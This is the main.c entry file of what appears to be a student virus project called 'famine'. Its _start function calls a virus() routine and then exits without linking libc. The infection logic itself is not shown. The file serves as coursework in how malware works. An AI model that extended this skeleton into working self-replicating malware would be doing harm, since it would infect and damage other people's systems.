/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/04 03:39:28 by agrumbac          #+#    #+#             */
/*   Updated: 2019/06/07 07:23:16 by agrumbac         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"
#include "syscall.h"

int	_start(void)
{
	virus();
	famine_exit(0);
	__builtin_unreachable();
}